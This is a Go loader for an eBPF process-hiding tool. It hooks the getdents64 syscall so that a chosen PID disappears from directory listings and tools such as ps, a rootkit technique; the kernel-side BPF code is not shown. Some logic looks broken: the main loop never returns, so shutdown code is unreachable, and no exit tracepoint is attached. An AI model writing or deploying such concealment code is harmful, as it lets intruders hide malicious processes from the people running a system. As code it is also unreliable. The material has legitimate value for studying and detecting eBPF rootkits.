// SPDX-License-Identifier: BSD-3-Clause
package main

import (
	"bytes"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strconv"
	"syscall"

	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/perf"
	"github.com/cilium/ebpf/ringbuf"
	"github.com/cilium/ebpf/rlimit"
)

// $BPF_CLANG and $BPF_CFLAGS are set by the Makefile.
//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc $BPF_CLANG -cflags $BPF_CFLAGS bpf pidhide.bpf.c -- -I../headers

// 事件结构体，与内核BPF程序中的event结构对应
type event struct {
	Pid     int32
	Comm    [16]byte
	Success bool
}

// 命令行参数
type config struct {
	pidToHide int
	targetPpid int
}

// 程序状态
type pidHideApp struct {
	objs     bpfObjects
	links    []link.Link
	config   config
}

func main() {
	var cfg config
	
	// 解析命令行参数
	flag.IntVar(&cfg.pidToHide, "p", 0, "Process ID to hide. Defaults to this program")
	flag.IntVar(&cfg.targetPpid, "t", 0, "Optional Parent PID, will only affect its children.")
	flag.Parse()

	// 检查是否指定了要隐藏的PID
	if cfg.pidToHide == 0 {
		fmt.Println("Pid Required, see --help")
		os.Exit(1)
	}

	// 停止信号通道，用于优雅退出
	stopper := make(chan os.Signal, 1)
	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)

	// 创建应用程序实例
	app := &pidHideApp{
		config: cfg,
	}

	// 初始化并运行程序
	if err := app.run(); err != nil {
		log.Fatalf("Error running program: %v", err)
	}

	// 等待停止信号
	<-stopper
	log.Println("Received signal, exiting program..")
	
	// 清理资源
	if err := app.close(); err != nil {
		log.Fatalf("Error closing program: %v", err)
	}
}

func (app *pidHideApp) run() error {
	// 1. 移除内存限制
	if err := rlimit.RemoveMemlock(); err != nil {
		return fmt.Errorf("remove memlock: %w", err)
	}

	// 2. 加载预编译的BPF程序
	spec, err := loadBpf()
	if err != nil {
		return fmt.Errorf("load BPF spec: %w", err)
	}

	// 3. 设置全局变量（只读数据）
	spec.RewriteConstants(map[string]interface{}{
		"pid_to_hide":      uint32(app.config.pidToHide),
		"pid_to_hide_len":  uint32(len(strconv.Itoa(app.config.pidToHide)) + 1),
		"target_ppid":      uint32(app.config.targetPpid),
	})

	// 4. 加载BPF程序到内核
	if err := spec.LoadAndAssign(&app.objs, nil); err != nil {
		return fmt.Errorf("load and assign BPF objects: %w", err)
	}
	defer func() {
		// 如果后续出错，清理已加载的资源
		if err != nil {
			app.objs.Close()
		}
	}()

	// 5. 设置程序数组映射（尾调用）
	// 添加handle_getdents_exit到索引1
	handleGetdentsExitFD := app.objs.HandleGetdentsExit.FD()
	if err := app.objs.MapProgArray.Put(uint32(1), uint32(handleGetdentsExitFD)); err != nil {
		return fmt.Errorf("put handle_getdents_exit to prog array: %w", err)
	}

	// 添加handle_getdents_patch到索引2
	handleGetdentsPatchFD := app.objs.HandleGetdentsPatch.FD()
	if err := app.objs.MapProgArray.Put(uint32(2), uint32(handleGetdentsPatchFD)); err != nil {
		return fmt.Errorf("put handle_getdents_patch to prog array: %w", err)
	}

	// 6. 附加跟踪点
	// 附加handle_getdents_entry到sys_enter_getdents64跟踪点
	kp, err := link.Tracepoint("syscalls", "sys_enter_getdents64", app.objs.HandleGetdentsEnter, nil)
	if err != nil {
		return fmt.Errorf("attach tracepoint sys_enter_getdents64: %w", err)
	}
	app.links = append(app.links, kp)

	// 7. 设置环形缓冲区读取器
	rb, err := ringbuf.NewReader(app.objs.Rb)
	if err != nil {
		return fmt.Errorf("create ringbuf reader: %w", err)
	}
	defer rb.Close()

	// 8. 启动事件处理goroutine
	events := make(chan event, 100)
	go app.handleEvents(rb, events)

	// 9. 打印启动信息
	fmt.Printf("Successfully started!\n")
	fmt.Printf("Hiding PID %d\n", app.config.pidToHide)
	if app.config.targetPpid > 0 {
		fmt.Printf("Only affecting children of PID %d\n", app.config.targetPpid)
	}

	// 10. 主循环：处理事件
	for {
		select {
		case e := <-events:
			if e.Success {
				comm := string(e.Comm[:bytes.IndexByte(e.Comm[:], 0)])
				fmt.Printf("Hid PID from program %d (%s)\n", e.Pid, comm)
			} else {
				comm := string(e.Comm[:bytes.IndexByte(e.Comm[:], 0)])
				fmt.Printf("Failed to hide PID from program %d (%s)\n", e.Pid, comm)
			}
		}
	}
}

func (app *pidHideApp) handleEvents(rb *ringbuf.Reader, events chan<- event) {
	var e event
	
	for {
		record, err := rb.Read()
		if err != nil {
			if errors.Is(err, ringbuf.ErrClosed) {
				// 环形缓冲区已关闭，正常退出
				return
			}
			log.Printf("Error reading from ringbuf: %v", err)
			continue
		}

		// 解析事件数据
		if err := binary.Read(bytes.NewBuffer(record.RawSample), binary.LittleEndian, &e); err != nil {
			log.Printf("Error parsing event: %v", err)
			continue
		}

		// 发送事件到主循环
		select {
		case events <- e:
		default:
			log.Println("Events channel full, dropping event")
		}
	}
}

func (app *pidHideApp) close() error {
	// 1. 关闭所有链接
	for _, l := range app.links {
		if err := l.Close(); err != nil {
			log.Printf("Error closing link: %v", err)
		}
	}

	// 2. 关闭BPF对象
	if err := app.objs.Close(); err != nil {
		return fmt.Errorf("close BPF objects: %w", err)
	}

	return nil
}

// 如果你使用perf事件缓冲区而不是ringbuf，这里有一个替代版本：
func handlePerfEvents(rd *perf.Reader, events chan<- event) {
	for {
		record, err := rd.Read()
		if err != nil {
			if errors.Is(err, perf.ErrClosed) {
				return
			}
			log.Printf("Error reading from perf buffer: %v", err)
			continue
		}

		if record.LostSamples > 0 {
			log.Printf("Lost %d samples", record.LostSamples)
			continue
		}

		var e event
		if err := binary.Read(bytes.NewBuffer(record.RawSample), binary.LittleEndian, &e); err != nil {
			log.Printf("Error parsing event: %v", err)
			continue
		}

		select {
		case events <- e:
		default:
			log.Println("Events channel full, dropping event")
		}
	}
}